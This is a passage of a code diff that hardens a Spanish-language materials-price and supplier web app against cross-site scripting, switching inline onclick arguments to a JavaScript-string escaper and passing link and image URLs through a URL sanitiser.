@@ -671,7 +671,7 @@ async function loadHomeCategories() {
                 const meta = CATEGORY_META[c.name] || { label: c.name, icon: '' };
                 const label = meta.label || c.name;
                 return `<span class="hcat${state.selectedCategory === c.name ? ' active' : ''}"
-                              onclick="selectCategory('${esc(c.name)}')">${meta.icon || ''} ${esc(label)} <small>(${c.count})</small></span>`;
+                              onclick="selectCategory('${escJs(c.name)}')">${meta.icon || ''} ${esc(label)} <small>(${c.count})</small></span>`;
             }).join('');
             container.innerHTML = `
                 <span class="hcat${!state.selectedCategory ? ' active' : ''}" onclick="selectCategory(null)">Todos</span>
@@ -692,7 +692,7 @@ function renderHomeSubcategories() {
     const chips = subs.map(s => {
         const active = state.selectedSubcategory === s.name;
         const label = s.name.replace(/_/g, ' ');
-        return `<span class="hsub${active ? ' active' : ''}" onclick="selectSubcategory('${esc(s.name)}')">${esc(label)} <small>(${s.count})</small></span>`;
+        return `<span class="hsub${active ? ' active' : ''}" onclick="selectSubcategory('${escJs(s.name)}')">${esc(label)} <small>(${s.count})</small></span>`;
     }).join('');
     sub.innerHTML = `<span class="hsub${!state.selectedSubcategory ? ' active' : ''}" onclick="selectSubcategory(null)">Todas</span>${chips}`;
     sub.style.display = '';
@@ -966,7 +966,7 @@ function renderSupplierCard(s) {
         : '';
 
     const opCities = (s.operating_cities || []).length > 1
-        ? `<div class="supplier-opcities">${icon('map-pin', 12)} ${s.operating_cities.join(', ')}</div>`
+        ? `<div class="supplier-opcities">${icon('map-pin', 12)} ${esc(s.operating_cities.join(', '))}</div>`
         : '';
 
     const featuredBadge = s.is_featured
@@ -979,7 +979,7 @@ function renderSupplierCard(s) {
             <div class="supplier-card-header">
                 <div>
                     <div class="supplier-name">${esc(s.trade_name || s.name)} ${featuredBadge}</div>
-                    <div class="supplier-location">${icon('map', 14)} ${location || 'Bolivia'}</div>
+                    <div class="supplier-location">${icon('map', 14)} ${esc(location || 'Bolivia')}</div>
                 </div>
                 ${rating}
             </div>
@@ -997,9 +997,9 @@ function renderSupplierCard(s) {
 // ── Render: Price card (reusable) ──────────────────────────────
 function renderPriceCard(p) {
     if (p.type === 'group') return renderGroupCard(p);
-    const addBtn = state.user ? `<button class="btn-cart-add" onclick="event.stopPropagation();addToCart(${p.id || 'null'},'${esc(p.name).replace(/'/g,"\\'")}','${esc(p.uom||'')}',${p.ref_price||'null'})" title="Agregar al carrito">${icon('plus',14)}</button>` : '';
-    const mapBtn = p.id ? `<button class="btn-map-suppliers" onclick="event.stopPropagation();viewSuppliersForInsumo(${p.id}, '${esc(p.name).replace(/'/g,"\\'")}')" title="Ver proveedores de este material en el mapa">${icon('map-pin', 14)}</button>` : '';
-    const specLink = p.spec_url ? `<a href="${esc(p.spec_url)}" target="_blank" rel="noopener" class="spec-link" onclick="event.stopPropagation()" title="Ficha tecnica">${icon('file-text',13)} Ficha</a>` : '';
+    const addBtn = state.user ? `<button class="btn-cart-add" onclick="event.stopPropagation();addToCart(${p.id || 'null'},'${escJs(p.name)}','${escJs(p.uom||'')}',${p.ref_price||'null'})" title="Agregar al carrito">${icon('plus',14)}</button>` : '';
+    const mapBtn = p.id ? `<button class="btn-map-suppliers" onclick="event.stopPropagation();viewSuppliersForInsumo(${p.id}, '${escJs(p.name)}')" title="Ver proveedores de este material en el mapa">${icon('map-pin', 14)}</button>` : '';
+    const specLink = p.spec_url ? `<a href="${esc(safeUrl(p.spec_url))}" target="_blank" rel="noopener" class="spec-link" onclick="event.stopPropagation()" title="Ficha tecnica">${icon('file-text',13)} Ficha</a>` : '';
     const clickAttr = p.id ? `onclick="openProduct(${p.id})" style="cursor:pointer"` : '';
     return `
         <div class="price-card" ${clickAttr}>
@@ -1052,10 +1052,10 @@ function renderGroupCard(g) {
                 <div class="group-variants" id="group-variants-${g.id}" style="display:none">
                     ${(g.insumos || []).map(i => `
                         <div class="variant-row" onclick="openProduct(${i.id})" style="cursor:pointer">
-                            <span class="variant-name">${esc(i.name)}${i.spec_url ? ` <a href="${esc(i.spec_url)}" target="_blank" rel="noopener" class="spec-link" onclick="event.stopPropagation()" title="Ficha tecnica">${icon('file-text',12)}</a>` : ''}</span>
+                            <span class="variant-name">${esc(i.name)}${i.spec_url ? ` <a href="${esc(safeUrl(i.spec_url))}" target="_blank" rel="noopener" class="spec-link" onclick="event.stopPropagation()" title="Ficha tecnica">${icon('file-text',12)}</a>` : ''}</span>
                             <span style="display:flex;align-items:center;gap:6px">
                                 <span class="variant-price">${i.ref_price ? i.ref_price.toFixed(2) : '--.--'} <span class="price-currency">${esc(i.ref_currency || 'BOB')}</span></span>
-                                ${state.user ? `<button class="btn-cart-add btn-cart-sm" onclick="event.stopPropagation();addToCart(${i.id || 'null'},'${esc(i.name).replace(/'/g,"\\'")}','${esc(i.uom||'')}',${i.ref_price||'null'})" title="Agregar al carrito">${icon('plus',12)}</button>` : ''}
+                                ${state.user ? `<button class="btn-cart-add btn-cart-sm" onclick="event.stopPropagation();addToCart(${i.id || 'null'},'${escJs(i.name)}','${escJs(i.uom||'')}',${i.ref_price||'null'})" title="Agregar al carrito">${icon('plus',12)}</button>` : ''}
                             </span>
                         </div>
                     `).join('')}
@@ -1105,7 +1105,7 @@ function _renderProductDetailHtml(p, sups, opts = {}) {
     const uomTxt = p.uom ? `<span class="pd-unit">/ ${esc(p.uom)}</span>` : '';
 
     const specBtn = p.spec_url
-        ? `<a href="${esc(p.spec_url)}" target="_blank" rel="noopener" class="btn btn-secondary pd-spec-btn">${icon('file-text', 14)} Ficha tecnica</a>`
+        ? `<a href="${esc(safeUrl(p.spec_url))}" target="_blank" rel="noopener" class="btn btn-secondary pd-spec-btn">${icon('file-text', 14)} Ficha tecnica</a>`
         : '';
 
     const regionalHtml = (p.regional_prices || []).length > 0
@@ -1141,7 +1141,7 @@ function _renderProductDetailHtml(p, sups, opts = {}) {
         ? `<div class="pd-section">
                <div class="pd-section-head">
                    <h3 class="pd-section-title">${sups.length} proveedor${sups.length > 1 ? 'es' : ''} lo ofrece${sups.length > 1 ? 'n' : ''}</h3>
-                   <button class="btn btn-secondary btn-sm" onclick="findSuppliersNearForProduct(${p.id}, '${esc(p.category || '').replace(/'/g,"\\'")}', ${inModal ? 'true' : 'false'}, '${esc(p.name || '').replace(/'/g,"\\'")}')">
+                   <button class="btn btn-secondary btn-sm" onclick="findSuppliersNearForProduct(${p.id}, '${escJs(p.category || '')}', ${inModal ? 'true' : 'false'}, '${escJs(p.name || '')}')">
                        ${icon('map-pin', 14)} Cerca de mi
                    </button>
                </div>
@@ -1164,7 +1164,7 @@ function _renderProductDetailHtml(p, sups, opts = {}) {
         : `<div class="pd-section">
                <div class="pd-section-head">
                    <p class="pd-empty-hint">Aun no hay proveedores registrados para este producto.</p>
-                   <button class="btn btn-secondary btn-sm" onclick="findSuppliersNearForProduct(${p.id}, '${esc(p.category || '').replace(/'/g,"\\'")}', ${inModal ? 'true' : 'false'}, '${esc(p.name || '').replace(/'/g,"\\'")}')">
+                   <button class="btn btn-secondary btn-sm" onclick="findSuppliersNearForProduct(${p.id}, '${escJs(p.category || '')}', ${inModal ? 'true' : 'false'}, '${escJs(p.name || '')}')">
                        ${icon('map-pin', 14)} Buscar cerca de mi
                    </button>
                </div>
@@ -1197,7 +1197,7 @@ function _renderProductDetailHtml(p, sups, opts = {}) {
             <a href="#" onclick="event.preventDefault();navigate('home')">Inicio</a>
             <span>&rsaquo;</span>
             <a href="#" onclick="event.preventDefault();navigate('prices')">Precios</a>
-            ${p.category ? `<span>&rsaquo;</span><a href="#" onclick="event.preventDefault();state.searchQuery='';state.selectedCategory='${esc(p.category).replace(/'/g,"\\'")}';navigate('prices')">${esc(p.category)}</a>` : ''}
+            ${p.category ? `<span>&rsaquo;</span><a href="#" onclick="event.preventDefault();state.searchQuery='';state.selectedCategory='${escJs(p.category)}';navigate('prices')">${esc(p.category)}</a>` : ''}
         </div>`;
 
     const canEdit = isManager();
@@ -1206,7 +1206,7 @@ function _renderProductDetailHtml(p, sups, opts = {}) {
     // encabezado.
     const imgSectionHtml = p.image_url
         ? `<div class="pd-image-section">
-               <img src="${esc(p.image_url)}" alt="${esc(p.name)}" loading="lazy">
+               <img src="${esc(safeUrl(p.image_url))}" alt="${esc(p.name)}" loading="lazy">
                ${canEdit ? `<button class="pd-img-edit" onclick="openInsumoImageUpload(${p.id})" title="Cambiar imagen">${icon('edit', 14)}</button>` : ''}
            </div>`
         : '';
@@ -1233,7 +1233,7 @@ function _renderProductDetailHtml(p, sups, opts = {}) {
                     <div class="pd-price-hint">Precio de referencia</div>
                     <div class="pd-actions">
                         ${specBtn}
-                        ${state.user ? `<button class="btn btn-primary" onclick="addToCart(${p.id},'${esc(p.name).replace(/'/g,"\\'")}','${esc(p.uom||'')}',${p.ref_price||'null'})">${icon('plus', 14)} Agregar al carrito</button>` : ''}
+                        ${state.user ? `<button class="btn btn-primary" onclick="addToCart(${p.id},'${escJs(p.name)}','${escJs(p.uom||'')}',${p.ref_price||'null'})">${icon('plus', 14)} Agregar al carrito</button>` : ''}
                         ${imgUploadBtn}
                     </div>
                 </div>
@@ -1390,7 +1390,7 @@ async function loadPriceCategories() {
                 <span class="chip${!state.selectedCategory ? ' active' : ''}" onclick="filterPriceCategory(null)">Todos</span>
                 ${resp.data.map(c => `
                     <span class="chip${state.selectedCategory === c.name ? ' active' : ''}"
-                          onclick="filterPriceCategory('${esc(c.name)}')">${esc(c.name)} (${c.count})</span>
+                          onclick="filterPriceCategory('${escJs(c.name)}')">${esc(c.name)} (${c.count})</span>
                 `).join('')}
             `;
         }
@@ -1723,7 +1723,7 @@ async function searchMaterialSuggestions() {
         }
         sug.innerHTML = items.map(p => {
             const price = p.ref_price ? `<span class="material-sug-price">${p.ref_price.toFixed(2)} ${esc(p.ref_currency || 'BOB')}</span>` : '';
-            return `<div class="material-sug-item" onclick="selectMaterialFilter(${p.id}, '${esc(p.name).replace(/'/g, "\\'")}')">
+            return `<div class="material-sug-item" onclick="selectMaterialFilter(${p.id}, '${escJs(p.name)}')">
                 <div>
                     <div class="material-sug-name">${esc(p.name)}</div>
                     <div class="material-sug-meta">${p.category ? esc(p.category) : ''}${p.uom ? ' · ' + esc(p.uom) : ''}</div>
@@ -1860,7 +1860,7 @@ async function loadSupplierCategoryChips() {
                 ${resp.data.map(c => {
                     const meta = CATEGORY_META[c.name] || { label: c.name, icon: '' };
                     return `<span class="chip${state.selectedCategory === c.name ? ' active' : ''}"
-                                  onclick="filterSupplierCategory('${esc(c.name)}')">${meta.icon} ${esc(meta.label || c.name)}</span>`;
+                                  onclick="filterSupplierCategory('${escJs(c.name)}')">${meta.icon} ${esc(meta.label || c.name)}</span>`;
                 }).join('')}
             `;
         }
@@ -1947,7 +1947,7 @@ async function showPublicSupplierDetail(supplierId) {
                 ? `<button class="btn-call btn-locked" onclick="showLoginModal()">${icon('lock', 14)} Llamar</button>`
                 : '');
         const webBtn = s.website
-            ? `<a href="${esc(s.website)}" target="_blank" rel="noopener" class="btn-call">${icon('globe', 16)} Web</a>`
+            ? `<a href="${esc(safeUrl(s.website))}" target="_blank" rel="noopener" class="btn-call">${icon('globe', 16)} Web</a>`
             : (locked && s.has_website
                 ? `<button class="btn-call btn-locked" onclick="showLoginModal()">${icon('lock', 14)} Web</button>`
                 : '');
@@ -2014,7 +2014,7 @@ async function showPublicSupplierDetail(supplierId) {
         }).join('');
 
         const opCities = (s.operating_cities || []).length > 0
-            ? `<div style="color:var(--gray-500);font-size:13px;margin-top:2px">${icon('map-pin',13)} Opera en: ${s.operating_cities.join(', ')}</div>`
+            ? `<div style="color:var(--gray-500);font-size:13px;margin-top:2px">${icon('map-pin',13)} Opera en: ${esc(s.operating_cities.join(', '))}</div>`
             : '';
 
         const phone2Btn = s.phone2
@@ -2043,7 +2043,7 @@ async function showPublicSupplierDetail(supplierId) {
                     </div>
                     ${rating}
                 </div>
-                <div style="color:var(--gray-500);margin-top:4px">${icon('map',14)} ${location || 'Bolivia'}</div>
+                <div style="color:var(--gray-500);margin-top:4px">${icon('map',14)} ${esc(location || 'Bolivia')}</div>
                 ${opCities}
                 ${s.address ? `<div style="color:var(--gray-500);font-size:13px;margin-top:2px">${esc(s.address)}</div>` : ''}
                 ${s.description ? `<div style="margin-top:8px;font-size:14px;color:var(--gray-600);line-height:1.4">${esc(s.description)}</div>` : ''}
@@ -2753,7 +2753,7 @@ function renderAdminDetailInfo() {
             <div><strong>Ciudad:</strong> ${esc(s.city) || '-'}</div>
             <div><strong>Departamento:</strong> ${esc(s.department) || '-'}</div>
             <div style="grid-column:1/-1"><strong>Direccion:</strong> ${esc(s.address) || '-'}</div>
-            <div><strong>Website:</strong> ${s.website ? `<a href="${esc(s.website)}" target="_blank">${esc(s.website)}</a>` : '-'}</div>
+            <div><strong>Website:</strong> ${s.website ? `<a href="${esc(safeUrl(s.website))}" target="_blank">${esc(s.website)}</a>` : '-'}</div>
             <div><strong>Canal preferido:</strong> ${esc(s.preferred_channel) || '-'}</div>
             <div><strong>Estado:</strong> <span class="badge badge-${stateColor}">${esc(s.verification_state)}</span></div>
             <div><strong>Rating:</strong> ${s.rating > 0 ? `${icon('star',14)} ${s.rating.toFixed(1)}` : '-'}</div>
@@ -3123,7 +3123,7 @@ function mergeSearchSupplier(side) {
                 return;
             }
             resultsDiv.innerHTML = resp.data.map(s => `
-                <div onclick="selectMergeSupplier('${side}', ${JSON.stringify(s).replace(/"/g, '&quot;')})"
+                <div onclick="selectMergeSupplier('${escJs(side)}', JSON.parse('${escJs(JSON.stringify(s))}'))"
                      style="padding:8px 12px;cursor:pointer;border-bottom:1px solid var(--gray-100);font-size:13px;transition:background 0.1s"
                      onmouseover="this.style.background='var(--gray-50)'" onmouseout="this.style.background='white'">
                     <strong>${esc(s.name)}</strong>
@@ -3202,7 +3202,7 @@ async function loadDuplicateSuggestions() {
                         <td><strong>${esc(b.name)}</strong>${b.trade_name ? `<br><small style="color:var(--gray-500)">${esc(b.trade_name)}</small>` : ''}
                             <br><small>${esc(b.city || '')} ${b.nit ? '&middot; NIT:' + esc(b.nit) : ''}</small></td>
                         <td><span style="color:${color};font-weight:600">${pct}%</span></td>
-                        <td><button class="btn btn-sm btn-primary" onclick="quickSelectMergePair(${a.id}, '${esc(a.name).replace(/'/g,"\\'")}', ${b.id}, '${esc(b.name).replace(/'/g,"\\'")}')">Fusionar</button></td>
+                        <td><button class="btn btn-sm btn-primary" onclick="quickSelectMergePair(${a.id}, '${escJs(a.name)}', ${b.id}, '${escJs(b.name)}')">Fusionar</button></td>
                     </tr>`;
                 }).join('')}</tbody>
             </table></div>
@@ -3229,7 +3229,7 @@ async function loadMergePreview() {
 
     try {
         const resp = await API.mergePreview(keepId, absorbId);
-        if (!resp.ok) { c.innerHTML = `<p style="color:var(--danger)">${resp.detail || 'Error'}</p>`; return; }
+        if (!resp.ok) { c.innerHTML = `<p style="color:var(--danger)">${esc(resp.detail || 'Error')}</p>`; return; }
         renderMergeComparison(resp.data);
     } catch (e) {
         c.innerHTML = `<p style="color:var(--danger)">Error: ${e.message}</p>`;
@@ -3625,7 +3625,7 @@ async function loadSupplierBranches(supplierId) {
                 <tr style="border-bottom:1px solid #f0f0f0">
                     <td>${esc(b.branch_name)}${b.is_main ? ' <span class="badge badge-success" style="font-size:10px">Principal</span>' : ''}</td>
                     <td>${esc(b.city || '-')}</td>
-                    <td>${b.whatsapp || '-'}</td>
+                    <td>${esc(b.whatsapp || '-')}</td>
                     <td>
                         <button class="btn btn-sm btn-secondary" onclick="showBranchForm(${supplierId}, ${b.id})" style="padding:2px 6px">${icon('edit',12)}</button>
                         <button class="btn btn-sm btn-danger" onclick="deleteBranch(${supplierId}, ${b.id})" style="padding:2px 6px">${icon('x',12)}</button>
@@ -4349,7 +4349,7 @@ async function showPriceHistory(insumoId, name) {
                     <button class="btn btn-primary btn-sm" onclick="refreshPrice(${insumoId})">
                         ${icon('trending-up', 14)} Actualizar precio ref. (mediana 12 meses)
                     </button>
-                    <button class="btn btn-secondary btn-sm" onclick="showAddPriceForm(${insumoId}, '${esc(name)}')">
+                    <button class="btn btn-secondary btn-sm" onclick="showAddPriceForm(${insumoId}, '${escJs(name)}')">
                         ${icon('plus', 14)} Agregar precio manual
                     </button>
                     <span id="refresh-result" style="font-size:13px;color:var(--gray-500)"></span>
@@ -4377,7 +4377,7 @@ async function showPriceHistory(insumoId, name) {
             html += `
                 <div class="empty-state" style="margin-bottom:16px">
                     <p>Sin historial de precios</p>
-                    <button class="btn btn-primary btn-sm" onclick="showAddPriceForm(${insumoId}, '${esc(name)}')">
+                    <button class="btn btn-primary btn-sm" onclick="showAddPriceForm(${insumoId}, '${escJs(name)}')">
                         ${icon('plus', 14)} Agregar primer precio
                     </button>
                 </div>
@@ -4397,7 +4397,7 @@ async function showPriceHistory(insumoId, name) {
                         <tbody>${supResp.data.map(r => `
                             <tr>
                                 <td><strong>${esc(r.supplier_name)}</strong></td>
-                                <td>${r.city || r.department || '-'}</td>
+                                <td>${esc(r.city || r.department || '-')}</td>
                                 <td>${r.order_count}</td>
                                 <td><strong>${Number(r.median_price).toFixed(2)}</strong></td>
                                 <td>${Number(r.min_price).toFixed(2)}</td>
@@ -4442,7 +4442,7 @@ async function showPriceHistory(insumoId, name) {
 function showAddPriceForm(insumoId, name) {
     const today = new Date().toISOString().split('T')[0];
     showModal(`Agregar precio: ${name}`, `
-        <form id="add-price-form" onsubmit="handleAddPrice(event, ${insumoId}, '${esc(name)}')">
+        <form id="add-price-form" onsubmit="handleAddPrice(event, ${insumoId}, '${escJs(name)}')">
             <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                 <div class="form-group">
                     <label class="form-label">Precio unitario *</label>
@@ -4556,7 +4556,7 @@ async function renderAdminReview() {
                     <select onchange="_reviewCategory=this.value;_reviewOffset=0;renderAdminReview()"
                             style="padding:6px 10px;border:1px solid #ddd;border-radius:4px">
                         <option value="">Todas las categorias</option>
-                        ${categories.map(c => `<option value="${c.name}" ${_reviewCategory === c.name ? 'selected' : ''}>${c.name} (${c.count})</option>`).join('')}
+                        ${categories.map(c => `<option value="${esc(c.name)}" ${_reviewCategory === c.name ? 'selected' : ''}>${c.name} (${c.count})</option>`).join('')}
                     </select>
                 </div>
             </div>
@@ -4589,7 +4589,7 @@ async function renderAdminReview() {
                             <td>${item.ref_price ? item.ref_price.toFixed(2) + ' Bs' : '-'}</td>
                             <td>${item.order_count || 0}</td>
                             <td>
-                                <button class="btn btn-sm btn-primary" onclick="showReviewApproveForm(${item._index}, ${JSON.stringify(JSON.stringify(item))})">
+                                <button class="btn btn-sm btn-primary" onclick="showReviewApproveForm(${item._index}, '${escJs(JSON.stringify(item))}')">
                                     ${icon('check', 14)} Aprobar
                                 </button>
                                 <button class="btn btn-sm btn-danger" onclick="rejectReviewItem(${item._index})">
@@ -4750,7 +4750,7 @@ async function loadAdminCategories() {
                         <td>${c.is_active ? '<span style="color:var(--success)">Si</span>' : '<span style="color:var(--danger)">No</span>'}</td>
                         <td style="white-space:nowrap">
                             <button class="btn btn-sm btn-secondary" onclick="showCategoryForm(${c.id})" title="Editar">${icon('edit',14)}</button>
-                            <button class="btn btn-sm btn-secondary" onclick="deleteCategory(${c.id}, '${esc(c.label)}')" title="Eliminar" style="color:var(--danger)">${icon('trash',14)}</button>
+                            <button class="btn btn-sm btn-secondary" onclick="deleteCategory(${c.id}, '${escJs(c.label)}')" title="Eliminar" style="color:var(--danger)">${icon('trash',14)}</button>
                         </td>
                     </tr>
                 `).join('')}</tbody>
@@ -4904,7 +4904,7 @@ async function loadAdminUoms() {
                         <td>${u.is_active ? '<span style="color:var(--success)">Si</span>' : '<span style="color:var(--danger)">No</span>'}</td>
                         <td style="white-space:nowrap">
                             <button class="btn btn-sm btn-secondary" onclick="showUomForm(${u.id})" title="Editar">${icon('edit',14)}</button>
-                            <button class="btn btn-sm btn-secondary" onclick="deleteUom(${u.id}, '${esc(u.label)}')" title="Eliminar" style="color:var(--danger)">${icon('trash',14)}</button>
+                            <button class="btn btn-sm btn-secondary" onclick="deleteUom(${u.id}, '${escJs(u.label)}')" title="Eliminar" style="color:var(--danger)">${icon('trash',14)}</button>
                         </td>
                     </tr>
                 `).join('')}</tbody>
@@ -5070,13 +5070,13 @@ async function loadAdminUsers() {
                     <tr>
                         <td><strong>${esc(u.full_name)}</strong></td>
                         <td>${esc(u.email)}</td>
-                        <td><span class="badge badge-${ROLE_COLORS[u.role] || 'gray'}">${ROLE_LABELS[u.role] || u.role}</span></td>
+                        <td><span class="badge badge-${ROLE_COLORS[u.role] || 'gray'}">${esc(ROLE_LABELS[u.role] || u.role)}</span></td>
                         <td>${u.company_name ? esc(u.company_name) : '-'}</td>
                         <td>${u.is_active ? '<span style="color:var(--success)">Si</span>' : '<span style="color:var(--danger)">No</span>'}</td>
                         <td>${u.last_login ? new Date(u.last_login).toLocaleDateString('es') : 'Nunca'}</td>
                         <td style="white-space:nowrap">
-                            <button class="btn btn-sm btn-secondary" onclick="showEditUserModal(${u.id}, '${esc(u.full_name)}', '${esc(u.role)}', ${u.is_active}, '${esc(u.telegram_user_id || '')}')" title="Editar">${icon('edit',14)}</button>
-                            ${isAdmin() ? `<button class="btn btn-sm btn-secondary" onclick="resetUserPassword(${u.id}, '${esc(u.full_name)}')" title="Resetear contrasena">${icon('key',14)}</button>` : ''}
+                            <button class="btn btn-sm btn-secondary" onclick="showEditUserModal(${u.id}, '${escJs(u.full_name)}', '${escJs(u.role)}', ${u.is_active}, '${escJs(u.telegram_user_id || '')}')" title="Editar">${icon('edit',14)}</button>
+                            ${isAdmin() ? `<button class="btn btn-sm btn-secondary" onclick="resetUserPassword(${u.id}, '${escJs(u.full_name)}')" title="Resetear contrasena">${icon('key',14)}</button>` : ''}
                         </td>
                     </tr>
                 `).join('')}</tbody>
@@ -5265,8 +5265,8 @@ async function loadAdminApiKeys() {
                         <td>${k.last_used_at ? new Date(k.last_used_at).toLocaleDateString('es') : 'Nunca'}</td>
                         <td>${k.usage_count}</td>
                         <td style="white-space:nowrap">
-                            <button class="btn btn-sm btn-secondary" onclick="showEditApiKeyModal(${k.id}, '${esc(k.name)}', '${esc(k.scopes)}', ${k.is_active})">${icon('edit',14)}</button>
-                            ${k.is_active ? `<button class="btn btn-sm btn-secondary" style="color:var(--danger)" onclick="revokeApiKey(${k.id}, '${esc(k.name)}')" title="Revocar">${icon('trash',14)}</button>` : ''}
+                            <button class="btn btn-sm btn-secondary" onclick="showEditApiKeyModal(${k.id}, '${escJs(k.name)}', '${escJs(k.scopes)}', ${k.is_active})">${icon('edit',14)}</button>
+                            ${k.is_active ? `<button class="btn btn-sm btn-secondary" style="color:var(--danger)" onclick="revokeApiKey(${k.id}, '${escJs(k.name)}')" title="Revocar">${icon('trash',14)}</button>` : ''}
                         </td>
                     </tr>`;
                 }).join('')}</tbody>
@@ -5340,7 +5340,7 @@ async function handleCreateApiKey(e) {
                     <div style="background:var(--gray-100);padding:16px;border-radius:var(--radius);margin-bottom:16px;word-break:break-all">
                         <code id="raw-key-display" style="font-size:15px;user-select:all">${esc(resp.data.raw_key)}</code>
                     </div>
-                    <button class="btn btn-primary" onclick="copyApiKey('${esc(resp.data.raw_key)}')" style="margin-bottom:8px">
+                    <button class="btn btn-primary" onclick="copyApiKey('${escJs(resp.data.raw_key)}')" style="margin-bottom:8px">
                         Copiar al portapapeles
                     </button>
                     <p style="font-size:12px;color:var(--gray-500);margin-top:8px">
@@ -5659,7 +5659,7 @@ async function renderAdminPlans() {
                         ${!p.is_active ? '<p style="color:#dc2626;font-size:12px;margin-top:6px;font-weight:600">INACTIVO</p>' : ''}
                         <div style="display:flex;gap:6px;margin-top:10px">
                             <button class="btn btn-sm btn-secondary" onclick="showPlanFormModal(${p.id})">Editar</button>
-                            <button class="btn btn-sm btn-danger" onclick="deletePlan(${p.id},'${esc(p.key).replace(/'/g,"\\'")}')">Eliminar</button>
+                            <button class="btn btn-sm btn-danger" onclick="deletePlan(${p.id},'${escJs(p.key)}')">Eliminar</button>
                         </div>
                     </div>
                 `).join('')}
@@ -5824,7 +5824,7 @@ async function renderAdminSubscriptions() {
                         <td>${s.max_pedidos_month === 999 ? '∞' : s.max_pedidos_month}</td>
                         <td>${s.expires_at ? new Date(s.expires_at).toLocaleDateString() : 'Sin limite'}</td>
                         <td>${s.last_payment_date ? new Date(s.last_payment_date).toLocaleDateString() + (s.last_payment_amount ? ' - ' + s.last_payment_amount.toFixed(2) + ' BOB' : '') : '-'}</td>
-                        <td><button class="btn btn-sm btn-secondary" onclick="showEditSubscriptionModal(${s.id},'${esc(s.plan)}','${esc(s.state)}',${s.max_users},${s.max_pedidos_month})">Editar</button></td>
+                        <td><button class="btn btn-sm btn-secondary" onclick="showEditSubscriptionModal(${s.id},'${escJs(s.plan)}','${escJs(s.state)}',${s.max_users},${s.max_pedidos_month})">Editar</button></td>
                     </tr>`).join('')}
                 </tbody>
             </table></div>
@@ -6188,7 +6188,7 @@ async function renderAdminTasks() {
                     <h3 class="task-card-title">${icon('clock', 16)} ${esc(j.label)}</h3>
                     <span class="task-card-cron">${esc(j.cron)}</span>
                 </div>
-                <button class="btn btn-sm btn-primary" onclick="runJobNow('${esc(j.name)}')" id="run-btn-${j.name}">
+                <button class="btn btn-sm btn-primary" onclick="runJobNow('${escJs(j.name)}')" id="run-btn-${j.name}">
                     ${icon('trending-up', 14)} Ejecutar Ahora
                 </button>
             </div>
@@ -6293,7 +6293,7 @@ async function renderAdminAI() {
             <div class="ai-providers-grid">${providerCards}</div>
 
             <form id="ai-config-form" onsubmit="handleSaveAIConfig(event)" style="margin-top:16px">
-                <input type="hidden" id="ai-providers-data" value='${providersJson.replace(/'/g, "&#39;")}'>
+                <input type="hidden" id="ai-providers-data" value="${esc(providersJson)}">
                 <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                     <div class="form-group">
                         <label class="form-label">Proveedor</label>
@@ -6456,7 +6456,7 @@ async function renderCompanyAIConfig(companyId) {
                 </div>
             ` : '<p style="font-size:13px;color:var(--gray-400);margin-bottom:12px">Usando configuracion del sistema.</p>'}
             <form onsubmit="handleSaveCompanyAI(event, ${companyId})">
-                <input type="hidden" id="company-ai-providers-data" value='${providersJson.replace(/'/g, "&#39;")}'>
+                <input type="hidden" id="company-ai-providers-data" value="${esc(providersJson)}">
                 <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                     <div class="form-group">
                         <label class="form-label">Proveedor</label>
@@ -7100,10 +7100,10 @@ async function renderAdminIntegrations() {
                         <div class="wa-instance-header">
                             <span class="wa-instance-label">${esc(inst.label || 'Instancia ' + (idx+1))}${inst.is_default ? ' <span class="badge badge-success" style="font-size:10px">Default</span>' : ''}</span>
                             <div style="display:flex;gap:4px">
-                                <button type="button" class="btn btn-sm btn-secondary" onclick="testWaInstance('${esc(inst.id)}')" title="Probar">${icon('play',14)}</button>
-                                ${!inst.is_default ? `<button type="button" class="btn btn-sm btn-secondary" onclick="setDefaultWaInstance('${esc(inst.id)}')" title="Hacer default">${icon('check',14)}</button>` : ''}
-                                <button type="button" class="btn btn-sm btn-secondary" onclick="editWaInstance('${esc(inst.id)}')" title="Editar">${icon('edit',14)}</button>
-                                <button type="button" class="btn btn-sm" style="color:var(--red-500)" onclick="removeWaInstance('${esc(inst.id)}')" title="Eliminar">${icon('x',14)}</button>
+                                <button type="button" class="btn btn-sm btn-secondary" onclick="testWaInstance('${escJs(inst.id)}')" title="Probar">${icon('play',14)}</button>
+                                ${!inst.is_default ? `<button type="button" class="btn btn-sm btn-secondary" onclick="setDefaultWaInstance('${escJs(inst.id)}')" title="Hacer default">${icon('check',14)}</button>` : ''}
+                                <button type="button" class="btn btn-sm btn-secondary" onclick="editWaInstance('${escJs(inst.id)}')" title="Editar">${icon('edit',14)}</button>
+                                <button type="button" class="btn btn-sm" style="color:var(--red-500)" onclick="removeWaInstance('${escJs(inst.id)}')" title="Eliminar">${icon('x',14)}</button>
                             </div>
                         </div>
                         <div class="wa-instance-details">
@@ -7615,7 +7615,7 @@ async function testRoutine() {
     if (resp.ok) {
         el.innerHTML = `<div style="background:#dcfce7;color:#166534;padding:10px;border-radius:8px;font-size:13px">
             ${icon('check',16)} Routine disparada! Session: ${esc(resp.data?.session_id || 'OK')}
-            ${resp.data?.url ? `<br><a href="${esc(resp.data.url)}" target="_blank">Ver sesion</a>` : ''}
+            ${resp.data?.url ? `<br><a href="${esc(safeUrl(resp.data.url))}" target="_blank">Ver sesion</a>` : ''}
         </div>`;
     } else {
         el.innerHTML = `<div style="background:#fee2e2;color:#991b1b;padding:10px;border-radius:8px;font-size:13px">
@@ -7959,11 +7959,11 @@ function showPedidoCreatedModal(pedido) {
             <p style="font-size:14px;color:var(--gray-600);margin-bottom:12px">
                 Para activar el seguimiento por WhatsApp el cliente debe abrir el siguiente enlace desde su celular y enviar el mensaje prellenado. Eso abre la ventana de 24h para que el operador pueda responder.
             </p>
-            <a href="${esc(waUrl)}" target="_blank" class="btn btn-primary" style="display:inline-flex;align-items:center;gap:8px;padding:12px 20px;font-size:15px;background:#25D366;border-color:#25D366">
+            <a href="${esc(safeUrl(waUrl))}" target="_blank" class="btn btn-primary" style="display:inline-flex;align-items:center;gap:8px;padding:12px 20px;font-size:15px;background:#25D366;border-color:#25D366">
                 ${icon('whatsapp',20)} Abrir WhatsApp
             </a>
             <div style="margin-top:10px;font-size:12px;color:var(--gray-500);word-break:break-all">
-                <strong>Link directo:</strong> <span onclick="navigator.clipboard.writeText('${esc(waUrl)}');toast('Copiado','success')" style="cursor:pointer;color:var(--primary);text-decoration:underline">${esc(waUrl)}</span>
